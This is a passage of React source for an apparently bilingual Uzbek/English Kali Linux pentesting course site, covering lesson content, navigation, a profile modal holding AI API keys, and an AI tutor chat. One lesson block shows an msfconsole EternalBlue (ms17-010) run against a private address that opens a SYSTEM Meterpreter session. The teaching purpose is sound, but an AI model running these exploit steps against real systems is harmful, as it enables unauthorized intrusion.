    React.createElement(CompareCols,{left:{title:{uz:"Bind shell",en:"Bind shell"},color:"#ffd43b",rows:[{uz:"Nishon portni ochib kutadi",en:"The target opens a port and waits"},{uz:"Hujumchi unga ulanadi",en:"The attacker connects to it"},{uz:"Firewall ko'pincha bloklaydi",en:"A firewall often blocks it"},]},right:{title:{uz:"Reverse shell",en:"Reverse shell"},color:"#69db7c",rows:[{uz:"Nishon hujumchiga ulanadi",en:"The target connects back to the attacker"},{uz:"Chiquvchi trafik — firewalldan o'tadi",en:"Outbound traffic — passes the firewall"},{uz:"Amaliyotda ko'proq ishlatiladi",en:"Used more often in practice"},]}}),
    React.createElement(H2,{num:"§7"},t(lang,"Interaktiv simulyator: nega reverse shell ishlaydi?","Interactive simulator: why does a reverse shell work?")),
    React.createElement(P,null,t(lang,"§6 dagi jadvalning ORQASIDA nima yotishini ko'ring — xuddi shu firewall ikkala shell turini qanday farqli ko'rishini sinang:","See what's BEHIND the §6 table — try how the exact same firewall treats each shell type differently:")),
    React.createElement(ShellConnectSim),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: msfconsole ish oqimi","Practice: the msfconsole workflow")),
    React.createElement(P,null,t(lang,"Metasploit'da search bilan modulni topib, use bilan tanlaysiz, set bilan parametrlarni sozlaysiz va run bilan ishga tushirasiz. Muvaffaqiyatda Meterpreter sessiyasi ochiladi.","In Metasploit you find a module with search, select it with use, configure options with set, and launch with run. On success a Meterpreter session opens.")),
    React.createElement(Terminal,null,"msf6 > search ms17-010\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS 10.0.0.5\nmsf6 > run\n# [*] Meterpreter session 1 opened (10.0.0.10 -> 10.0.0.5)\nmeterpreter > getuid\n# Server username: NT AUTHORITY\\SYSTEM"),
    React.createElement(Quiz,{q:{uz:"Ekspluatatsiya muvaffaqiyatli bo'lgach nishonda bajariladigan kod qanday modul deyiladi?",en:"What module runs on the target after a successful exploit?"},opts:[{uz:"Exploit",en:"Exploit"},{uz:"Payload",en:"Payload"},{uz:"Auxiliary",en:"Auxiliary"},{uz:"Encoder",en:"Encoder"}],correct:1,exp:{uz:"Payload — ekspluatatsiya muvaffaqiyatli bo'lganda nishonda bajariladigan kod (masalan Meterpreter reverse shell).",en:"The payload is the code run on the target once the exploit succeeds (e.g. a Meterpreter reverse shell)."}}));
}
function ComingSoon({lesson}){
  const lang=useLang();
  return React.createElement("div",{style:{textAlign:"center",padding:"60px 20px",color:"var(--text-3)"}},
    React.createElement("div",{style:{fontSize:48,marginBottom:16}},"🐉"),
    React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:20,fontWeight:700,color:"var(--text-1)",marginBottom:8}},
      t(lang,"Tez kunda","Coming Soon")),
    React.createElement("div",{style:{fontSize:13,color:"var(--text-2)"}},
      lesson?(t(lang,lesson.uz,lesson.en||lesson.uz)):"")
  );
}

// ── TopNav ────────────────────────────────────────────────────
function TopNav({setRoute,user,onOpenProfile,onOpenAI,setLang}){
  const lang=useLang();
  return React.createElement("nav",{style:{position:"sticky",top:0,zIndex:100,height:60,background:"rgba(4,6,13,0.92)",backdropFilter:"blur(12px)",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",padding:"0 24px",gap:12}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",display:"flex",alignItems:"center",gap:8,color:"var(--accent)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700,letterSpacing:1,padding:0}},
      React.createElement(Icon,{name:"terminal",size:16}),
      "KALI ACADEMY"
    ),
    React.createElement("div",{style:{flex:1}}),
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},
      lang==="uz"?"UZ":"EN"
    ),
    user&&React.createElement("button",{onClick:onOpenProfile,style:{appearance:"none",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",fontFamily:"var(--font-mono)",fontSize:10,color:"var(--accent)",fontWeight:700}},
      user.name?.slice(0,2).toUpperCase()||"KA"
    ),
    React.createElement("button",{onClick:onOpenAI,style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 10px",color:"var(--text-2)",fontSize:13,display:"flex",alignItems:"center",gap:4}},
      React.createElement(Icon,{name:"spark",size:13})," AI"
    )
  );
}

// ── Landing Screen ────────────────────────────────────────────
function LandingScreen({setRoute,setLang}){
  const lang=useLang();
  return React.createElement("div",{style:{position:"relative",minHeight:"100vh",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:24,textAlign:"center"}},
    React.createElement("button",{onClick:()=>setLang&&setLang(lang==="uz"?"en":"uz"),style:{position:"absolute",top:20,right:20,appearance:"none",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:8,cursor:"pointer",padding:"6px 12px",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,fontWeight:700}},
      lang==="uz"?"UZ | EN":"EN | UZ"),
    React.createElement("div",{style:{maxWidth:600}},
      React.createElement("div",{style:{width:72,height:72,borderRadius:20,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px",boxShadow:"0 0 32px var(--accent-glow)"}},
        React.createElement(Icon,{name:"terminal",size:32,style:{color:"var(--accent)"}})
      ),
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--accent)",letterSpacing:3,marginBottom:12}},
        "KALI LINUX ACADEMY v1.0"
      ),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:"clamp(28px,5vw,48px)",fontWeight:900,margin:"0 0 16px",lineHeight:1.15}},
        t(lang,"Kali Linux'ni","Master"),
        React.createElement("br",null),
        React.createElement("span",{style:{background:"linear-gradient(135deg,var(--accent),#c084fc)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}},
          t(lang,"Egallang","Kali Linux")
        )
      ),
      React.createElement("p",{style:{fontSize:15,color:"var(--text-2)",marginBottom:32,lineHeight:1.7}},
        t(lang,
          "Kali asoslaridan imtiyozlarni oshirishgacha — 38 ta dars, real terminal buyruqlari va AI muallim bilan professional pentester bo'ling.",
          "From Kali basics to privilege escalation — 38 lessons, real terminal commands and an AI tutor to become a professional pentester."
        )
      ),
      React.createElement("div",{style:{display:"flex",gap:12,justifyContent:"center",flexWrap:"wrap"}},
        React.createElement("button",{
          onClick:()=>setRoute("dashboard"),
          style:{padding:"14px 32px",borderRadius:12,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:15,fontWeight:700,boxShadow:"0 0 24px var(--accent-glow)"}
        },t(lang,"Boshlash →","Start →")),
        React.createElement("a",{
          href:"../index.html",
          style:{padding:"14px 24px",borderRadius:12,cursor:"pointer",appearance:"none",background:"transparent",border:"1px solid var(--border)",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:12,fontWeight:600,textDecoration:"none",display:"flex",alignItems:"center",gap:6}
        },"← CyberSecurity")
      ),
      React.createElement("div",{style:{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:12,marginTop:48}},
        [{icon:"terminal",n:"38",uz:"Dars",en:"Lessons"},{icon:"target",n:"4",uz:"Bo'lim",en:"Sections"},{icon:"star",n:"∞",uz:"XP",en:"XP"}].map((s,i)=>
          React.createElement("div",{key:i,style:{padding:16,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12}},
            React.createElement(Icon,{name:s.icon,size:20,style:{color:"var(--accent)",display:"block",margin:"0 auto 8px"}}),
            React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:18,fontWeight:900,color:"var(--text-0)"}},s.n),
            React.createElement("div",{style:{fontSize:11,color:"var(--text-3)"}},t(lang,s.uz,s.en))
          )
        )
      )
    )
  );
}

// ── Dashboard Screen ──────────────────────────────────────────
function DashboardScreen({setRoute,user}){
  const lang=useLang();
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:1100,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("div",{style:{marginBottom:28,display:"flex",alignItems:"center",justifyContent:"space-between"}},
      React.createElement("div",null,
        React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:24,fontWeight:800,margin:0}},
          t(lang,"Kurslar","Courses")),
        React.createElement("div",{style:{fontSize:12,color:"var(--text-2)",marginTop:4,fontFamily:"var(--font-mono)"}},
          completed.length,"/38 ",t(lang,"dars bajarildi","lessons completed")
        )
      ),
      React.createElement("div",{style:{textAlign:"right"}},
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},"LVL "+xpToLevel(user?.xp||0)),
        React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:16,fontWeight:900,color:"var(--accent)"}},(user?.xp||0)+" XP")
      )
    ),
    Object.values(SECTIONS).map(sec=>React.createElement("div",{key:sec.num,
      onClick:()=>setRoute({name:"section",sec:parseInt(sec.num)}),
      style:{marginBottom:16,padding:20,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16,cursor:"pointer",transition:"all 200ms"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:14,marginBottom:10}},
        React.createElement("div",{style:{width:44,height:44,borderRadius:12,background:sec.color+"22",border:`1px solid ${sec.color}44`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}},
          React.createElement(Icon,{name:sec.icon,size:20,style:{color:sec.color}})
        ),
        React.createElement("div",null,
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1}},
            "SEC "+sec.num),
          React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700,color:"var(--text-0)"}},
            t(lang,sec.uz,sec.en)
          )
        ),
        React.createElement("div",{style:{marginLeft:"auto",fontFamily:"var(--font-mono)",fontSize:11,color:"var(--text-3)"}},
          sec.count+" "+t(lang,"dars","lessons"))
      ),
      React.createElement("p",{style:{fontSize:12.5,color:"var(--text-2)",margin:0,lineHeight:1.6}},
        t(lang,sec.descUz,sec.descEn))
    ))
  );
}

// ── Section Screen ─────────────────────────────────────────────
function SectionScreen({setRoute,user,sec=1}){
  const lang=useLang();
  const section=SECTIONS[sec];
  const lessons=Object.values(LESSONS).filter(l=>l.sec===sec);
  const completed=user?.completedLessons||[];
  return React.createElement("div",{style:{maxWidth:1100,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute("dashboard"),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,"Kurslar","Courses")
    ),
    React.createElement("div",{style:{marginBottom:24}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:section.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        "SEC "+section.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:26,fontWeight:800,margin:"0 0 8px"}},
        t(lang,section.uz,section.en)),
      React.createElement("p",{style:{fontSize:13,color:"var(--text-2)",margin:0}},
        t(lang,section.descUz,section.descEn))
    ),
    lessons.map(l=>{
      const key=`ka_l${l.num.slice(1)}`;
      const done=completed.includes(key);
      return React.createElement("div",{key:l.num,
        onClick:()=>setRoute({name:"lesson",num:parseInt(l.num.slice(1))}),
        style:{display:"flex",alignItems:"center",gap:12,padding:"14px 16px",marginBottom:8,background:"var(--surface)",border:"1px solid var(--border)",borderRadius:12,cursor:"pointer",transition:"all 150ms"}},
        React.createElement("div",{style:{width:32,height:32,borderRadius:8,background:done?"var(--accent-soft)":section.color+"22",border:`1px solid ${done?"var(--accent)":section.color+"44"}`,display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:done?"var(--accent)":section.color}},
          done?React.createElement(Icon,{name:"check",size:14}):l.num.slice(1)
        ),
        React.createElement("div",{style:{flex:1}},
          React.createElement("div",{style:{fontWeight:600,fontSize:13,color:"var(--text-0)"}},
            t(lang,l.uz,l.en||l.uz)),
          React.createElement("div",{style:{fontSize:11,color:"var(--text-3)",marginTop:2}},l.sub)
        ),
        React.createElement(Icon,{name:"arrow",size:14,style:{color:"var(--text-3)"}})
      );
    })
  );
}

// ── Lesson Screen ─────────────────────────────────────────────
function LessonScreen({setRoute,user,markComplete,num=1}){
  const lang=useLang();
  const [done,setDone]=useState(false);
  const lesson=LESSONS[num]||LESSONS[1];
  const lessonKey=`ka_l${String(num).padStart(2,"0")}`;
  const alreadyDone=(user?.completedLessons||[]).includes(lessonKey);
  const sec=SECTIONS[lesson.sec];

  const content=num===1?React.createElement(LessonL01):
    num===2?React.createElement(LessonL02):
    num===3?React.createElement(LessonL03):
    num===4?React.createElement(LessonL04):
    num===5?React.createElement(LessonL05):
    num===6?React.createElement(LessonL06):
    num===7?React.createElement(LessonL07):
    num===8?React.createElement(LessonL08):
    num===9?React.createElement(LessonL09):
    num===10?React.createElement(LessonL10):
    num===11?React.createElement(LessonL11):
    num===12?React.createElement(LessonL12):
    num===13?React.createElement(LessonL13):
    num===14?React.createElement(LessonL14):
    num===15?React.createElement(LessonL15):
    num===16?React.createElement(LessonL16):
    num===17?React.createElement(LessonL17):
    num===18?React.createElement(LessonL18):
    num===19?React.createElement(LessonL19):
    num===20?React.createElement(LessonL20):
    num===21?React.createElement(LessonL21):
    num===22?React.createElement(LessonL22):
    num===23?React.createElement(LessonL23):
    num===24?React.createElement(LessonL24):
    num===25?React.createElement(LessonL25):
    num===26?React.createElement(LessonL26):
    num===27?React.createElement(LessonL27):
    num===28?React.createElement(LessonL28):
    num===29?React.createElement(LessonL29):
    num===30?React.createElement(LessonL30):
    num===31?React.createElement(LessonL31):
    num===32?React.createElement(LessonL32):
    num===33?React.createElement(LessonL33):
    num===34?React.createElement(LessonL34):
    num===35?React.createElement(LessonL35):
    num===36?React.createElement(LessonL36):
    num===37?React.createElement(LessonL37):
    num===38?React.createElement(LessonL38):
    React.createElement(ComingSoon,{lesson});

  return React.createElement("div",{style:{maxWidth:1100,margin:"0 auto",padding:"24px 16px"}},
    React.createElement("button",{onClick:()=>setRoute({name:"section",sec:lesson.sec}),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:11,marginBottom:16,padding:0,display:"flex",alignItems:"center",gap:6}},
      "← ",t(lang,sec.uz,sec.en)
    ),
    React.createElement("div",{style:{marginBottom:24,padding:"20px 24px",background:"var(--surface)",border:"1px solid var(--border)",borderRadius:16}},
      React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:sec.color,fontWeight:700,letterSpacing:1,marginBottom:6}},
        lesson.num),
      React.createElement("h1",{style:{fontFamily:"var(--font-display)",fontSize:22,fontWeight:800,margin:"0 0 6px"}},
        t(lang,lesson.uz,lesson.en||lesson.uz)),
      React.createElement("div",{style:{fontSize:12,color:"var(--text-2)"}},lesson.sub)
    ),
    content,
    !alreadyDone&&!done&&React.createElement("button",{
      onClick:()=>{markComplete&&markComplete(lessonKey);setDone(true);},
      style:{marginTop:24,padding:"12px 28px",borderRadius:10,cursor:"pointer",appearance:"none",background:"var(--accent)",border:"none",color:"#04060d",fontFamily:"var(--font-display)",fontSize:14,fontWeight:700,boxShadow:"0 0 20px var(--accent-glow)"}
    },t(lang,"Darsni yakunlash ✓","Complete Lesson ✓")),
    (alreadyDone||done)&&React.createElement("div",{style:{marginTop:24,padding:"14px",background:"var(--accent-soft)",border:"1px solid var(--accent-border)",borderRadius:10,textAlign:"center",fontFamily:"var(--font-mono)",fontSize:12,color:"var(--accent)"}},
      t(lang,"✓ Dars bajarildi! +50 XP","✓ Lesson completed! +50 XP"))
  );
}

// ── Profile Modal ─────────────────────────────────────────────
function ProfileModal({user,theme,setTheme,onSave,onClose,lang}){
  const [name,setName]=useState(user?.name||"Student");
  const [saved,setSaved]=useState(false);
  const [aiKeys,setAiKeys]=useState(()=>loadAiKeys());
  const [activeId,setActiveId]=useState(()=>{
    const k=loadAiKeys();const id=localStorage.getItem(AI_ACTIVE_STORE)||"";
    return k.find(x=>x.id===id)?id:(k[0]?.id||"");
  });
  const [adding,setAdding]=useState(false);
  const [nProv,setNProv]=useState("");
  const [nKey,setNKey]=useState("");
  const [showKey,setShowKey]=useState(false);
  const PROVS=[{id:"groq",label:"Groq",hint:"gsk_...",free:true},{id:"openai",label:"OpenAI",hint:"sk-..."},{id:"anthropic",label:"Claude",hint:"sk-ant-..."},{id:"gemini",label:"Gemini",hint:"AIza..."}];
  const THEMES=["violet","cyan","green"];
  const save=()=>{onSave({name:name.trim()||"Student"});setSaved(true);setTimeout(()=>setSaved(false),1800);};
  const addKey=()=>{
    if(!nProv||!nKey.trim()||aiKeys.length>=3)return;
    const e={id:Date.now().toString(),provider:nProv,key:nKey.trim()};
    const u=[...aiKeys,e];setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(!activeId){setActiveId(e.id);try{localStorage.setItem(AI_ACTIVE_STORE,e.id);}catch{}}
    setNProv("");setNKey("");setAdding(false);
  };
  const removeKey=id=>{
    const u=aiKeys.filter(k=>k.id!==id);setAiKeys(u);
    try{localStorage.setItem(AI_KEYS_STORE,JSON.stringify(u));}catch{}
    if(activeId===id){const nx=u[0]?.id||"";setActiveId(nx);try{localStorage.setItem(AI_ACTIVE_STORE,nx);}catch{}}
  };
  const activateKey=id=>{setActiveId(id);try{localStorage.setItem(AI_ACTIVE_STORE,id);}catch{}};
  return React.createElement("div",{style:{position:"fixed",inset:0,zIndex:1000,background:"rgba(2,4,10,0.85)",backdropFilter:"blur(8px)",display:"grid",placeItems:"center",padding:20},
    onClick:e=>e.target===e.currentTarget&&onClose()},
    React.createElement("div",{style:{background:"rgba(8,12,24,0.98)",border:"1px solid var(--accent-border)",borderRadius:20,width:"100%",maxWidth:460,overflow:"hidden"}},
      React.createElement("div",{style:{padding:"18px 24px",borderBottom:"1px solid var(--border)",display:"flex",justifyContent:"space-between",alignItems:"center"}},
        React.createElement("div",{style:{fontFamily:"var(--font-display)",fontSize:17,fontWeight:700}},t(lang,"Profil","Profile")),
        React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:16}))
      ),
      React.createElement("div",{style:{padding:"20px 24px",display:"flex",flexDirection:"column",gap:18}},
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// ISM","// NAME")),
          React.createElement("input",{value:name,onChange:e=>setName(e.target.value),maxLength:30,
            style:{width:"100%",boxSizing:"border-box",background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:"9px 12px",fontSize:13,color:"var(--text-0)",outline:"none"}})
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// RANG_MAVZU","// THEME")),
          React.createElement("div",{style:{display:"flex",gap:8}},
            THEMES.map(th=>{const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};return React.createElement("button",{key:th,onClick:()=>setTheme(th),style:{flex:1,padding:"8px 0",borderRadius:8,cursor:"pointer",appearance:"none",border:`2px solid ${theme===th?colors[th]:"var(--border)"}`,background:theme===th?`${colors[th]}18`:"var(--bg-2)",color:theme===th?colors[th]:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,textTransform:"capitalize"}},th);})
          )
        ),
        React.createElement("div",null,
          React.createElement("label",{style:{fontSize:10,fontFamily:"var(--font-mono)",color:"var(--accent)",letterSpacing:"0.1em",textTransform:"uppercase",display:"block",marginBottom:6}},
            t(lang,"// AI_KALITLAR","// AI_KEYS")),
          aiKeys.map(k=>{const pv=PROVS.find(p=>p.id===k.provider);const isAct=k.id===activeId;const mk=k.key.length>8?k.key.slice(0,4)+"****"+k.key.slice(-4):"****";
            return React.createElement("div",{key:k.id,style:{display:"flex",alignItems:"center",gap:8,padding:"7px 10px",borderRadius:8,marginBottom:5,border:`1.5px solid ${isAct?"var(--accent)":"var(--border)"}`,background:isAct?"var(--accent-soft)":"var(--bg-2)"}},
              React.createElement("div",{style:{width:7,height:7,borderRadius:"50%",background:isAct?"var(--accent)":"var(--border)",flexShrink:0}}),
              React.createElement("div",{style:{flex:1,minWidth:0}},
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700,color:isAct?"var(--accent)":"var(--text-1)"}},(pv?.label||k.provider)),
                React.createElement("span",{style:{fontFamily:"var(--font-mono)",fontSize:10,color:"var(--text-3)",marginLeft:6}},mk)
              ),
              isAct?React.createElement("span",{style:{fontSize:8,fontFamily:"var(--font-mono)",color:"var(--accent)",fontWeight:900,padding:"1px 5px",border:"1px solid var(--accent)",borderRadius:3}},t(lang,"FAOL","ACTIVE")):
                React.createElement("button",{onClick:()=>activateKey(k.id),style:{appearance:"none",background:"none",border:"1px solid var(--border)",borderRadius:5,cursor:"pointer",fontSize:8,fontFamily:"var(--font-mono)",color:"var(--text-2)",padding:"1px 5px",fontWeight:700}},t(lang,"Faollashtir","Activate")),
              React.createElement("button",{onClick:()=>removeKey(k.id),style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--c-attack)",opacity:0.7,padding:"0 2px",fontSize:12,lineHeight:1}},"✕")
            );
          }),
          aiKeys.length===0&&!adding&&React.createElement("div",{style:{fontSize:10,color:"var(--text-3)",fontFamily:"var(--font-mono)",textAlign:"center",padding:"6px 0"}},t(lang,"Hali kalit qo'shilmagan","No keys added")),
          adding&&React.createElement("div",{style:{background:"var(--bg-2)",border:"1px solid var(--border)",borderRadius:8,padding:10,marginTop:4}},
            React.createElement("div",{style:{display:"flex",gap:4,marginBottom:7,flexWrap:"wrap"}},
              PROVS.map(p=>React.createElement("button",{key:p.id,onClick:()=>setNProv(p.id),style:{flex:"1 1 auto",padding:"5px 4px",borderRadius:6,cursor:"pointer",appearance:"none",border:`1.5px solid ${nProv===p.id?"var(--accent)":"var(--border)"}`,background:nProv===p.id?"var(--accent-soft)":"transparent",color:nProv===p.id?"var(--accent)":"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:9,fontWeight:700}},p.label,p.free&&React.createElement("span",{style:{display:"block",fontSize:7,color:"var(--accent)"}},t(lang,"BEPUL","FREE"))))
            ),
            nProv&&React.createElement("div",{style:{position:"relative",marginBottom:6}},
              React.createElement("input",{type:showKey?"text":"password",placeholder:PROVS.find(p=>p.id===nProv)?.hint||"",value:nKey,onChange:e=>setNKey(e.target.value),
                style:{width:"100%",boxSizing:"border-box",background:"rgba(0,0,0,0.3)",border:"1px solid var(--border)",borderRadius:6,padding:"7px 32px 7px 10px",fontSize:11,fontFamily:"var(--font-mono)",color:"var(--text-0)",outline:"none"}}),
              React.createElement("button",{onClick:()=>setShowKey(s=>!s),style:{position:"absolute",right:8,top:"50%",transform:"translateY(-50%)",background:"none",border:"none",cursor:"pointer",color:"var(--text-3)",fontSize:12,padding:0}},showKey?"🙈":"👁")
            ),
            React.createElement("div",{style:{display:"flex",gap:5}},
              React.createElement("button",{onClick:()=>{setAdding(false);setNProv("");setNKey("");},style:{flex:"0 0 auto",padding:"5px 10px",borderRadius:5,cursor:"pointer",appearance:"none",border:"1px solid var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Bekor","Cancel")),
              React.createElement("button",{onClick:addKey,disabled:!nProv||!nKey.trim(),style:{flex:1,padding:"5px 0",borderRadius:5,cursor:nProv&&nKey.trim()?"pointer":"not-allowed",appearance:"none",border:`1px solid ${nProv&&nKey.trim()?"var(--accent)":"var(--border)"}`,background:nProv&&nKey.trim()?"var(--accent)":"transparent",color:nProv&&nKey.trim()?"#04060d":"var(--text-3)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:700}},t(lang,"Qo'shish","Add"))
            )
          ),
          !adding&&aiKeys.length<3&&React.createElement("button",{onClick:()=>setAdding(true),style:{width:"100%",marginTop:5,padding:"6px 0",borderRadius:7,cursor:"pointer",appearance:"none",border:"1px dashed var(--border)",background:"transparent",color:"var(--text-2)",fontFamily:"var(--font-mono)",fontSize:10,fontWeight:600}},
            `+ ${t(lang,"API kalit qo'shish","Add API key")}${aiKeys.length>0?` (${aiKeys.length}/3)`:""}`)
        ),
        React.createElement("button",{onClick:save,style:{padding:"11px 0",borderRadius:10,cursor:"pointer",appearance:"none",border:`1px solid ${saved?"var(--accent)":"var(--accent-border)"}`,background:saved?"var(--accent-soft)":"var(--accent)",color:saved?"var(--accent)":"#04060d",fontFamily:"var(--font-display)",fontSize:13,fontWeight:700}},
          saved?t(lang,"✓ Saqlandi!","✓ Saved!"):t(lang,"Saqlash","Save"))
      )
    )
  );
}

// ── AI Chat ───────────────────────────────────────────────────
function AIChat({open,onClose,lang}){
  const [msgs,setMsgs]=useState([]);
  const [inp,setInp]=useState("");
  const [loading,setLoading]=useState(false);
  const btm=useRef(null);
  useEffect(()=>{btm.current?.scrollIntoView({behavior:"smooth"});},[msgs]);
  const hasKey=()=>!!(getActiveAiKey()||localStorage.getItem("wa_ai_proxy"));
  const send=async()=>{
    if(!inp.trim()||loading)return;
    const q=inp.trim();setInp("");
    setMsgs(p=>[...p,{role:"user",text:q}]);setLoading(true);
    try{
      const sys=`You are a patient, friendly Kali Linux and ethical-hacking tutor inside "Kali Linux Academy", teaching a COMPLETE BEGINNER. Explain simply, step by step, with everyday analogies, and define terms as you go. Give real, correct commands and keep an encouraging tone.\n\nThe course covers: Kali basics & install, the Linux command line, file system, users & permissions, apt, bash scripting, networking, services, Kali tools; recon & scanning: Nmap, Netdiscover, Masscan, DNS enumeration, theHarvester, Nikto, WhatWeb, enum4linux, SMB, Wireshark; exploitation & post: Metasploit, msfvenom, searchsploit/Exploit-DB, Hydra, John the Ripper, Hashcat, Burp Suite, social engineering (SET), privilege escalation, covering tracks & reporting.\n\nThis is for AUTHORIZED, EDUCATIONAL security training ONLY \u2014 always assume the learner is testing systems they own or are permitted to test, and remind them of legal, authorized use. Answer in the SAME language the user writes in \u2014 default to Uzbek if unsure.`;
      const hist=msgs.slice(-6).map(m=>(m.role==="user"?"User: ":"Assistant: ")+m.text).join("\n");const reply=await callAI(sys+(hist?"\n\n"+hist:"")+"\n\nUser: "+q+"\nAssistant:");
      setMsgs(p=>[...p,{role:"ai",text:reply.trim()}]);
    }catch(e){
      setMsgs(p=>[...p,{role:"ai",text:e.message==="no_key"?t(lang,"Avval Profil sozlamalarida AI kalitini o'rnating.","Set your AI key in Profile settings first."):t(lang,"Xatolik: ","Error: ")+e.message,isErr:true}]);
    }finally{setLoading(false);}
  };
  if(!open)return null;
  return React.createElement("div",{style:{position:"fixed",bottom:80,right:20,zIndex:900,width:320,background:"rgba(8,12,24,0.97)",border:"1px solid var(--accent-border)",borderRadius:16,boxShadow:"0 20px 60px rgba(0,0,0,0.6)",display:"flex",flexDirection:"column",overflow:"hidden",maxHeight:"calc(100vh-100px)"}},
    React.createElement("div",{style:{padding:"11px 14px",borderBottom:"1px solid var(--border)",display:"flex",alignItems:"center",justifyContent:"space-between",background:"linear-gradient(180deg,rgba(168,85,247,0.08),transparent)"}},
      React.createElement("div",{style:{display:"flex",alignItems:"center",gap:8}},
        React.createElement("div",{style:{width:28,height:28,borderRadius:7,background:"var(--accent-soft)",border:"1px solid var(--accent-border)",display:"grid",placeItems:"center"}},
          React.createElement(Icon,{name:"spark",size:13,style:{color:"var(--accent)"}})
        ),
        React.createElement("div",null,
          React.createElement("div",{style:{fontWeight:600,fontSize:12}},t(lang,"AI Muallim","AI Tutor")),
          React.createElement("div",{style:{fontFamily:"var(--font-mono)",fontSize:8,color:"var(--accent)",letterSpacing:0.5}},"KALI ACADEMY")
        )
      ),
      React.createElement("button",{onClick:onClose,style:{appearance:"none",background:"none",border:"none",cursor:"pointer",color:"var(--text-2)"}},React.createElement(Icon,{name:"x",size:14}))
    ),
    React.createElement("div",{style:{flex:1,overflowY:"auto",padding:"12px 12px 0",minHeight:240}},
      msgs.length===0&&React.createElement("div",{style:{textAlign:"center",padding:"20px 10px",color:"var(--text-3)",fontSize:12}},
        React.createElement("div",{style:{fontSize:28,marginBottom:8}},"🐉"),
        t(lang,"Kali va pentest haqida savol bering!","Ask about Kali & pentesting!"),
        !hasKey()&&React.createElement("div",{style:{marginTop:8,padding:"8px 10px",background:"rgba(255,180,0,0.08)",border:"1px solid rgba(255,180,0,0.25)",borderRadius:8,fontSize:11,color:"var(--c-warn)"}},
          t(lang,"⚠ Profilda AI kalitini o'rnating.","⚠ Set AI key in Profile."))
      ),
      msgs.map((m,i)=>React.createElement("div",{key:i,style:{marginBottom:8,display:"flex",flexDirection:"column",alignItems:m.role==="user"?"flex-end":"flex-start"}},
